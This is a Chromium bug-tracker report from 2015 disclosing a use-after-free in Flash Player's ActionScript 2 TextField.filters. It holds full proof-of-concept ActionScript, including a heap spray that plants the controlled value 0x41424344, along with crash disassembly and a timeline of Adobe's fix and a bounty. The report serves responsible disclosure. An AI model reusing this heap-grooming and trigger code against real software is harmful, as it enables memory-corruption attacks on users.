# Security: Flash AS2 Use After Free in TextField.filters 

| Field | Value |
|-------|-------|
| **Issue ID** | [40081389](https://issues.chromium.org/issues/40081389) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-02-10 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**

There is a use after free vulnerability in the ActionScript 2 TextField.filters array property. When the TextField.filters array  

is set, Flash creates an internal array holding the filters. When the property is read, Flash iterates over this array and clones  

each filter. During this loop, it is possible to execute some AS2 code by overriding a filter's constructor. At that moment, if  

the AS2 code alters the filters array, Flash frees the internal array leaving a reference to freed memory in the stack. When the  

execution flow resumes to the loop, a use-after-free occurs.

**VERSION**  

Chrome Version: 40.0.2214.111 stable, Flash 16.0.0.305  

Operating System: Win7 SP1 x64

The AS2 FiltusPafus.fla can be compiled with Flash CS5. I tried with mtasc but it didn't give the expected results.  

Just put FiltusPafus.swf in a browsable directory and run the swf with Chrome. It should crash while dereferencing 0x41424344.

Some disasm, pepflashplayer.dll based at 0x6A5B0000:

Address Hex dump Command Comments  

6A732D89 8B16 MOV EDX,DWORD PTR DS:[ESI]  

6A732D8B 8B02 MOV EAX,DWORD PTR DS:[EDX]  

6A732D8D 6A 00 PUSH 0  

6A732D8F 8BCE MOV ECX,ESI  

6A732D91 FFD0 CALL EAX  

6A732D93 8B0D 90C0376B MOV ECX,DWORD PTR DS:[6B37C090]  

6A732D99 8BD6 MOV EDX,ESI  

6A732D9B E8 BABF3E00 CALL 6AB1ED5A  

6A732DA0 8B4C24 28 MOV ECX,DWORD PTR SS:[ESP+28]  

6A732DA4 8B11 MOV EDX,DWORD PTR DS:[ECX]  

6A732DA6 8B42 18 MOV EAX,DWORD PTR DS:[EDX+18] ; crash with edx = 0x41424344  

6A732DA9 FFD0 CALL EAX

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of FiltusPafus.fla

import flash.filters.GlowFilter;

var a1:Array = new Array()  

var a2:Array = new Array()  

for (i = 0; i<0x50/4;i++) {  

a2[i] = 0x41424344  

}

//init the heap with buffers of 50h bytes  

for (var i = 0; i<0x200;i++) {  

var tf:TextFormat = new TextFormat()  

a1[i] = tf  

}  

for (var i = 0; i<0x200;i++) {  

a1[i].tabStops = a2  

}

var tfield:TextField = createTextField("tf",1,1,2,3,4)  

var glowfilter:GlowFilter = new GlowFilter(1,2,3,4,5,6,true,true)

//set the filters array  

tfield.filters = [glowfilter]

function f() {  

for (var i = 0; i<0x20;i++) {  

\_global.a1[0x100+i\*4].tabStops = [1,2,3,4]  

}  

\_global.tfield.filters = []  

for (var i = 0; i<0x200;i++) {  

\_global.a1[i].tabStops = a2  

}

}

\_global.tfield = tfield  

\_global.f = f  

\_global.a1 = a1  

\_global.a2 = a2

//override the ctor before getting the filters prop  

flash.filters.GlowFilter = MyGlowFilter  

var a = tfield.filters

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of MyGlowFilter.as:

import flash.filters.GlowFilter;  

class MyGlowFilter extends flash.filters.GlowFilter {  

public function MyGlowFilter (a,b,c,d,e,f,g,h)  

{  

super(a,b,c,d,e,f,g,h);  

\_global.f()  

}  

}

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of FiltusPafus\_poc.fla

import flash.filters.GlowFilter;

var tfield:TextField = createTextField("tf",1,1,2,3,4)  

var glowfilter:GlowFilter = new GlowFilter(1,2,3,4,5,6,true,true)  

tfield.filters = [glowfilter]

function f() {  

\_global.tfield.filters = []  

}

\_global.tfield = tfield  

\_global.f = f

flash.filters.GlowFilter = MyGlowFilter  

var a = tfield.filters

## Attachments

- [FiltusPafus.zip](attachments/FiltusPafus.zip) (application/zip, 12.5 KB)

## Timeline

### ri...@chromium.org (2015-02-10)

[Empty comment from Monorail migration]

### ri...@chromium.org (2015-02-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-02-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-02-11)

Nice. Filing report with Adobe now.

### sc...@gmail.com (2015-02-11)

(Oh, and confirm crash with same register value and asm as provided by @biloulehibou)

### sc...@gmail.com (2015-02-11)

Adobe tracking as PSIRT-3300.

### sc...@gmail.com (2015-04-10)

[Empty comment from Monorail migration]

### [Deleted User] (2015-05-01)

Was fixed: https://helpx.adobe.com/security/products/flash-player/apsb15-06.html

### cl...@chromium.org (2015-08-08)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-08-17)

As discussed, reward should arrive this week.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/457278?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081389)*
